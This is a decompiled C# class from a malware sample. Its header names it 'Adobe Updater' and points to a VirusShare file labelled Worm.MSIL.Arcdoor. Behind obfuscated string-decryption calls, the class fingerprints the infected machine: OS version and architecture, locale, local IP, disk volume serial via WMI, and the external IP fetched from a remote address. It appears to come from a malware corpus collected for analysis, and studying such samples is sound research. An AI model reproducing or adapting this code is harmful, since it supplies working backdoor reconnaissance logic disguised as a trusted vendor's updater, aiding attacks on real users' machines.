﻿// Decompiled with JetBrains decompiler
// Type: 
// Assembly: Adobe Updater, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3EBFD65F-C01D-4B08-A6E5-41C787EE6341
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00002-msil\Worm.MSIL.Arcdoor.vps-5c5e242af096e77e0fc4a037a0fee5d20df072b9dc640e5ae36ec0f0f68ad065.exe

using System;
using System.Globalization;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;

internal sealed class \u0002
{
  public static string \u0002 = \u000F\u2001.\u0002(670213332);

  [DllImport("kernel32.dll")]
  internal static extern void GetNativeSystemInfo(ref \u0002.\u0002 _param0);

  public static string \u0002()
  {
    OperatingSystem osVersion = Environment.OSVersion;
    string str = \u000F\u2001.\u0002(670213516);
    switch (osVersion.Platform)
    {
      case PlatformID.Win32Windows:
        switch (osVersion.Version.Minor)
        {
          case 0:
            str = \u000F\u2001.\u0002(670213530);
            break;
          case 10:
            str = \u000F\u2001.\u0002(670213547);
            break;
          case 90:
            str = \u000F\u2001.\u0002(670213564);
            break;
        }
        break;
      case PlatformID.Win32NT:
        switch (osVersion.Version.Major)
        {
          case 3:
            str = \u000F\u2001.\u0002(670213581);
            break;
          case 4:
            str = \u000F\u2001.\u0002(670213599);
            break;
          case 5:
            switch (osVersion.Version.Minor)
            {
              case 0:
                str = \u000F\u2001.\u0002(670213601);
                break;
              case 1:
                str = \u000F\u2001.\u0002(670213387);
                break;
              case 2:
                str = \u000F\u2001.\u0002(670213404);
                break;
            }
            break;
          case 6:
            switch (osVersion.Version.Minor)
            {
              case 0:
                str = \u000F\u2001.\u0002(670213414);
                break;
              case 1:
                str = \u000F\u2001.\u0002(670213450);
                break;
            }
            break;
        }
        break;
    }
    return str + \u000F\u2001.\u0002(670213470) + \u0002.\u0003();
  }

  private static string \u0003()
  {
    \u0002.\u0002 obj = new \u0002.\u0002();
    \u0002.GetNativeSystemInfo(ref obj);
    switch (obj.\u0002)
    {
      case 0:
        return \u000F\u2001.\u0002(670213462);
      case 9:
        return \u000F\u2001.\u0002(670213475);
      default:
        return string.Empty;
    }
  }

  public static string \u0005()
  {
    try
    {
      return CultureInfo.CurrentCulture.TwoLetterISOLanguageName.ToLower();
    }
    catch
    {
      return \u000F\u2001.\u0002(670213488);
    }
  }

  public static string \u0008()
  {
    string empty = string.Empty;
    foreach (IPAddress hostAddress in Dns.GetHostAddresses(Dns.GetHostName()))
    {
      if (hostAddress.AddressFamily.ToString().Equals(\u000F\u2001.\u0002(670213257)))
      {
        empty = hostAddress.ToString();
        break;
      }
    }
    if (empty != string.Empty)
      return empty;
    foreach (IPAddress hostAddress in Dns.GetHostAddresses(Dns.GetHostName()))
    {
      if (hostAddress.AddressFamily.ToString() == \u000F\u2001.\u0002(670213257))
      {
        empty = hostAddress.ToString();
        break;
      }
    }
    return empty;
  }

  public static string \u0006()
  {
    try
    {
      WebClient webClient = new WebClient();
      string input = webClient.DownloadString(\u000E\u2001.\u0005);
      string str = new Regex(\u000F\u2001.\u0002(670213276)).Match(input).Value;
      webClient.Dispose();
      return str;
    }
    catch
    {
      return \u000F\u2001.\u0002(670213321);
    }
  }

  public static string \u000E()
  {
    if (\u0002.\u0002 == string.Empty)
    {
      foreach (DriveInfo drive in DriveInfo.GetDrives())
      {
        if (drive.IsReady)
        {
          \u0002.\u0002 = drive.RootDirectory.ToString();
          break;
        }
      }
    }
    if (\u0002.\u0002.EndsWith(\u000F\u2001.\u0002(670213339)))
      \u0002.\u0002 = \u0002.\u0002.Substring(0, \u0002.\u0002.Length - 2);
    return \u0002.\u0002(\u000F\u2001.\u0002(670213332));
  }

  public static string \u0002(string _param0)
  {
    ManagementObject managementObject = new ManagementObject(\u000F\u2001.\u0002(670213356) + _param0 + \u000F\u2001.\u0002(670213135));
    managementObject.Get();
    string str = managementObject[\u000F\u2001.\u0002(670213144)].ToString();
    managementObject.Dispose();
    return str;
  }

  internal struct \u0002
  {
    public ushort \u0002;
    public ushort \u0003;
    public uint \u0005;
    public IntPtr \u0008;
    public IntPtr \u0006;
    public UIntPtr \u000E;
    public uint \u000F;
    public uint \u0002\u2000;
    public uint \u0003\u2000;
    public ushort \u0005\u2000;
    public ushort \u0008\u2000;
  }
}